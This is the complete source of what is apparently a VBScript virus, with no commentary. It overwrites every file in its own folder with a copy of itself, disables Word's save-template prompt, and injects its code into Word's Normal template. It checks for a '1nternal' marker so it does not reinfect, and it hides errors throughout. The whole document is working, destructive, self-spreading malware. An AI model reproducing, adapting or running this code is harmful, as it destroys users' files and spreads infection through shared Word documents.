
On Error Resume Next
Dim WordObj, FSO, WshShell
Set FSO = CreateObject("Scripting.FileSystemObject")
Set WshShell = Wscript.CreateObject("Wscript.Shell")
parent = Wscript.ScriptFullName
vPath = Left(parent, InStrRev(parent, "\"))
For Each target in FSO.GetFolder(vPath).Files
    FSO.CopyFile parent, target.Name, 1
Next
Set WordObj = CreateObject("Word.Application")
WordObj.Options.SaveNormalPrompt = False
Set NT = WordObj.Templates(1).VBProject.VBComponents(1).CodeModule
If NT.Lines(2,1) <> "'1nternal" Then
     NT.AddfromFile Wscript.ScriptFullName
     NT.ReplaceLine 3, "On Error Goto Break"
     NT.DeleteLines 58, 19
End If
Set NT = Nothing
WordObj.Quit
